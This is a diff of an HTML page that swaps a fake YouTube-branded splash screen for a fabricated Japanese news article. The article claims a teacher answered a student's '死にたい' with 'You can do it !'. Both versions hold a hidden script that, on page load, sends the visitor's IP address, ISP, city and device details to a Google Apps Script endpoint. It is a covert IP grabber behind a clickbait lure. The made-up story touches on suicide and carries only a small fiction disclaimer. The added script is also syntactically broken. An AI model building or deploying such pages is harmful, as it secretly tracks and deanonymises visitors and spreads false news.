@@ -3,195 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube</title>
-    <link rel="icon" href="channels4_profile.jpg">
+    
+    <!-- 検索エンジンにインデックスされないようにする設定 -->
+    <meta name="robots" content="noindex, nofollow">
+    
+    <!-- OGP (SNSシェア時の画像やタイトルの設定) -->
+    <meta property="og:title" content="【一宮市】中学校の生徒が告発|「死にたい」に丸を付け「You can do it !」と記述">
+    <meta property="og:description" content="愛知県一宮市の中学校で起きた不適切指導の波紋。生徒のSOSに対する教師の対応に批判殺到。">
+    <meta property="og:image" content="school1.jpg">
+    <meta property="og:type" content="article">
+
+    <title>【一宮市】中学校の生徒が告発|「死にたい」に丸を付け「You can do it !」と記述</title>
+    
     <style>
-        :root { --yt-red: #ff0000; --bg-black: #020202; }
-        body { margin: 0; padding: 0; background-color: var(--bg-black); color: #ffffff; font-family: sans-serif; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        
-        #star-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-
-        #main-viewport { 
-            position: relative; width: 90vw; height: 80vh; z-index: 10; 
-            overflow: hidden; /* スライドアウトした文字を隠す */
+        body {
+            font-family: 'Helvetica Neue', Arial, 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', Meiryo, sans-serif;
+            color: #333;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
         }
-        
-        /* P1〜P5をまとめるコンテナ */
-        #stack-container { 
-            position: absolute; width: 100%; height: 100%; top: 0; left: 0;
-            transition: transform 1s cubic-bezier(0.65, 0, 0.35, 1), opacity 0.8s ease; 
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px 40px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-
-        .text-element { position: absolute; font-weight: 900; line-height: 1.1; opacity: 0; letter-spacing: -0.05em; word-break: keep-all; }
-
-        /* イントロ：純粋な赤 */
-        #intro-msg {
-            font-size: clamp(32px, 6vw, 55px); width: 100%; text-align: center; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            color: var(--yt-red); text-shadow: 0 0 25px var(--yt-red);
-            animation: introIn 1.5s ease forwards;
+        .header-category {
+            color: #d32f2f;
+            font-weight: bold;
+            font-size: 0.9em;
+            margin-bottom: 10px;
         }
-
-        @keyframes introIn {
-            0% { transform: translate(-50%, -30%); opacity: 0; filter: blur(10px); }
-            20% { opacity: 1; filter: blur(0); }
-            80% { opacity: 1; transform: translate(-50%, -50%); }
-            100% { transform: translate(-50%, -180%); opacity: 0; }
+        h1 {
+            font-size: 1.8em;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+            margin-top: 0;
         }
-
-        .bold-xl { font-size: clamp(45px, 9vw, 100px); }
-        .bold-lg { font-size: clamp(30px, 6vw, 60px); }
-        .bold-md { font-size: clamp(18px, 3.2vw, 34px); }
-        .highlight { color: var(--yt-red); }
-
-        #p1 { top: 5%; left: 0%; transform: translateX(-100px); }
-        #p2 { top: 20%; right: 0%; transform: translateX(100px); text-align: right; }
-        #p3 { top: 42%; left: 2%; transform: translateY(50px); }
-        #p4 { top: 58%; right: 5%; transform: translateX(100px); text-align: right; }
-        #p5 { bottom: 5%; left: 0%; transform: scale(0.8); }
-
-        /* 最後のメッセージ：中央配置・下からフェードイン */
-        #p6 {
-            position: absolute; width: 100%; text-align: center; 
-            top: 50%; left: 50%;
-            transform: translate(-50%, 100px); /* 最初は下の方に配置 */
-            opacity: 0;
-            font-size: clamp(24px, 4.5vw, 45px);
-            transition: all 1s cubic-bezier(0.16, 1, 0.3, 1);
+        .date {
+            color: #666;
+            font-size: 0.9em;
+            text-align: right;
         }
-
-        .active-p { opacity: 1 !important; transform: translate(0, 0) scale(1) !important; transition: all 0.8s cubic-bezier(0.16, 1, 0.3, 1); }
-        
-        /* スライドアップ実行クラス */
-        .slide-up-exit { transform: translateY(-100vh) !important; opacity: 0 !important; }
-        
-        /* 最後の文字を中央へ移動 */
-        #p6.active-final { opacity: 1 !important; transform: translate(-50%, -50%) !important; }
-
-        #progress-line { position: fixed; top: 0; left: 0; height: 3px; background: var(--yt-red); width: 0%; z-index: 100; box-shadow: 0 0 15px var(--yt-red); }
+        .main-img {
+            width: 100%;
+            height: auto;
+            margin: 20px 0;
+            background-color: #eee;
+            border: 1px solid #ccc;
+        }
+        .article-body {
+            font-size: 1.1em;
+        }
+        .notice {
+            margin-top: 50px;
+            padding: 10px;
+            background-color: #eee;
+            font-size: 0.8em;
+            color: #555;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
 
-<canvas id="star-canvas"></canvas>
-<div id="progress-line"></div>
+<div class="container">
+    <div class="header-category">社会・事件</div>
+    <h1>【一宮市】中学校の生徒が告発|「死にたい」に丸を付け「You can do it !」と記述</h1>
+    <div class="date">2026年7月17日 12:00 配信</div>
 
-<div id="main-viewport">
-    <div id="intro-msg" class="text-element">あと10秒だけ時間をください！</div>
+    <!-- 学校のイメージ画像 -->
+    <img src="school1.jpg" alt="中学校のイメージ画像" class="main-img" onerror="this.src='https://via.placeholder.com/800x400?text=school.jpg';">
 
-    <div id="stack-container">
-        <div id="p1" class="text-element bold-xl"><span class="highlight">YouTube</span>は、</div>
-        <div id="p2" class="text-element bold-lg">世界最大の<br>動画共有プラットフォーム。</div>
-        <div id="p3" class="text-element bold-md">25億人の<span class="highlight">アクティブユーザー</span>と共に、</div>
-        <div id="p4" class="text-element bold-md">Googleが買収した2006年から現在まで、<br>メディアの歴史を塗り替え続けています。</div>
-        <div id="p5" class="text-element bold-lg">さらなる<span class="highlight">未体験</span>のステージへ。</div>
+    <div class="article-body">
+        <p>愛知県一宮市内の公立中学校で、生徒が提出した生活記録ノートの記述に対し、担任教師が極めて不適切な書き込みをしていたことが明らかになった。</p>
+        <p>関係者によると、同校に通う中学2年の生徒が、日々の悩みを綴るノートの隅に「死にたい」と切実な思いを記述。しかし、提出されたノートが返却されると、その言葉には赤いペンで丸が付けられ、隣に「You can do it !（君ならできる！）」と英語で書かれていたという。</p>
+        <p>ショックを受けた生徒は不登校状態となり、事態を重く見た保護者がSNS上でノートの写真を添えて告発。ネット上では「SOSを完全に馬鹿にしている」「教師としてあり得ないサイコパス的対応だ」と非難の声が殺到している。</p>
+        <p>市教育委員会は取材に対し「現在、該当する学校および教師への事実確認を急いでいる。事実であれば厳正に対処する」とコメントしており、今後の調査結果が待たれる。</p>
     </div>
-
-    <div id="p6" class="text-element bold-md highlight">現在、最高の視聴環境を構築しています...</div>
+    
+    <div class="notice">
+        ※この記事はフィクション（妄想）であり、実在の人物・団体・事件とは一切関係ありません。
+    </div>
 </div>
 
 <script>
-    const GAS_URL = "https://script.google.com/macros/s/AKfycbxdoT9D8bGfdFWaCS4f7dAucnxy04BNzJoCU0Bb-QZB5hQc5EA0cM27AZEdF7HuD60YuQ/exec";
-    const REDIRECT_URL = "https://www.youtube.com/@YouTubeJapan/videos";
+// --- アクセス情報取得 ＆ GAS送信スクリプト ---
 
-    // --- 正確なクライアント情報取得 ---
-    async function getClientData() {
-        let model = "不明なデバイス";
-        const ua = navigator.userAgent;
-        
-        // 1. Client Hints (Chrome等)
-        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            const h = await navigator.userAgentData.getHighEntropyValues(['model']);
-            if (h.model) model = h.model;
-        }
+// 1. GASのウェブアプリURLをここに設定
+const GAS_URL = "https://script.google.com/macros/s/AKfycbyhsYw72eMXVFdUgYGE-GUU_UGZNW3hC2Zjr4aOSaz1tZ-AFJno7EgM3yO5_4lyU8Cs/exec";
 
-        // 2. iOS精密判定 (Safari等)
-        const w = screen.width, h = screen.height, r = window.devicePixelRatio;
-        if (/iPhone/.test(ua)) {
-            const sig = `${Math.min(w,h)}x${Math.max(w,h)}@${r}`;
-            const ios = {"430x932@3":"iPhone 15/14 Pro Max","393x852@3":"iPhone 15/14 Pro","390x844@3":"iPhone 14/13/12 Pro","428x926@3":"iPhone 14/13/12 Pro Max","375x812@3":"iPhone mini/X/XS","414x896@3":"iPhone 11/XS Max","414x896@2":"iPhone XR/11","375x667@2":"iPhone SE/8/7"};
-            model = ios[sig] || "iPhone";
-        } else if (/CrOS/.test(ua)) model = "Chromebook";
-        else if (/Android/.test(ua)) {
-            const m = ua.match(/Android\s.*?\s([^;]*)\sBuild/);
-            model = m ? m[1] : "Android端末";
-        } else if (/Mac/.test(ua)) model = "Mac";
-        else if (/Windows/.test(ua)) model = "Windows PC";
+// 簡易的なOS判定
+function getOS(ua) {
+    if (ua.indexOf("CrOS") !== -1) return "Chrome OS";
+    if (ua.indexOf("Win") !== -1) return "Windows";
+    if (ua.indexOf("Mac") !== -1) return "Mac OS";
+    if (ua.indexOf("Android") !== -1) return "Android";
+    if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "iOS";
+    if (ua.indexOf("Linux") !== -1) return "Linux";
+    return "Unknown OS";
+}
 
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        let gpu = "不明";
-        if (gl) {
-            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-            gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "WebGL対応";
-        }
+// 簡易的なブラウザ判定
+function getBrowser(ua) {
+    if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edg") === -1) return "Chrome";
+    if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) return "Safari";
+    if (ua.indexOf("Firefox") !== -1) return "Firefox";
+    if (ua.indexOf("Edg") !== -1) return "Edge";
+    return "Unknown Browser";
+}
 
-        return { model, gpu, ua };
-    }
+window.onload = function() {
+    const ua = navigator.userAgent;
+    const referer = document.referrer || "HTTP-Refererは空です。";
+    
+    // 日時の取得 (例: 2026/07/17 7:22:14)
+    const now = new Date();
+    const dateStr = now.getFullYear() + "/" + 
+                    String(now.getMonth() + 1).padStart(2, '0') + "/" + 
+                    String(now.getDate()).padStart(2, '0') + " " + 
+                    String(now.getHours()).padStart(2, '0') + ":" + 
+                    String(now.getMinutes()).padStart(2, '0') + ":" + 
+                    String(now.getSeconds()).padStart(2, '0');
 
-    async function startSequence() {
-        const bar = document.getElementById('progress-line');
-        const stack = document.getElementById('stack-container');
-        const p6 = document.getElementById('p6');
-
-        await new Promise(r => setTimeout(r, 1600));
-
-        // 蓄積
-        const blocks = ['p1', 'p2', 'p3', 'p4', 'p5'];
-        for (let i = 0; i < blocks.length; i++) {
-            document.getElementById(blocks[i]).classList.add('active-p');
-            bar.style.width = ((i + 1) / (blocks.length + 1) * 80) + "%";
-            await new Promise(r => setTimeout(r, 1100));
-        }
-
-        // --- スライドアップアニメーション ---
-        stack.classList.add('slide-up-exit'); // 物理的に上に突き抜ける
-        await new Promise(r => setTimeout(r, 600)); // スライドの途中で次を出す
-        
-        p6.classList.add('active-final'); // 下から中央へフェードイン
-        bar.style.width = "100%";
-        
-        await new Promise(r => setTimeout(r, 2500));
-        window.location.replace(REDIRECT_URL);
-    }
-
-    async function collectAndSend() {
-        try {
-            const geo = await (await fetch('https://ipapi.co/json/')).json();
-            const client = await getClientData();
-            
+    // 外部API (ipapi.co) を使ってIP、ISP、位置情報を取得
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
             const payload = {
-                ip: geo.ip, location: `${geo.country_name} / ${geo.city}`, isp: geo.org,
-                model: client.model, gpu: client.gpu,
-                cpu: navigator.hardwareConcurrency || "不明", memory: navigator.deviceMemory || "不明",
-                screen: `${screen.width}x${screen.height} (DPR:${window.devicePixelRatio})`,
-                browser: navigator.platform, ua: client.ua,
-                lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                ref: document.referrer || "直接アクセス"
+                date: dateStr,
+                ip: data.ip || "Unknown",
+                isp: data.org || "Unknown",
+                country: data.country_name || "Unknown",
+                city: data.city || "Unknown",
+                os: getOS(ua),
+                browser: getBrowser(ua),
+                referer: referer,
+                ua: ua
             };
-            fetch(GAS_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
-        } catch (e) { console.error(e); }
-    }
 
-    function initStars() {
-        const canvas = document.getElementById('star-canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const stars = [];
-        for(let i=0; i<150; i++) stars.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, size: Math.random()*1.5, alpha: Math.random(), speed: Math.random()*0.02 });
-        function draw() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            stars.forEach(s => {
-                s.alpha += s.speed; if(s.alpha > 1 || s.alpha < 0) s.speed *= -1;
-                ctx.fillStyle = `rgba(255, 255, 255, ${Math.abs(s.alpha)})`;
-                ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI*2); ctx.fill();
+            // GASへPOSTリクエストで送信
+            fetch(GAS_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'text/plain' // GASのCORS制約を回避するためにtext/plainを使用
+                },
+                body: JSON.stringify(payload)
+                console.error("Error logging data:", err);
             });
-            requestAnimationFrame(draw);
-        }
-        draw();
-    }
-
-    window.onload = () => { initStars(); collectAndSend(); startSequence(); };
-    setTimeout(() => { window.location.replace(REDIRECT_URL); }, 15000);
+        })
+        .catch(err => {
+            console.error("Error fetching IP info:", err);
+        });
+};
 </script>
+
 </body>
 </html>
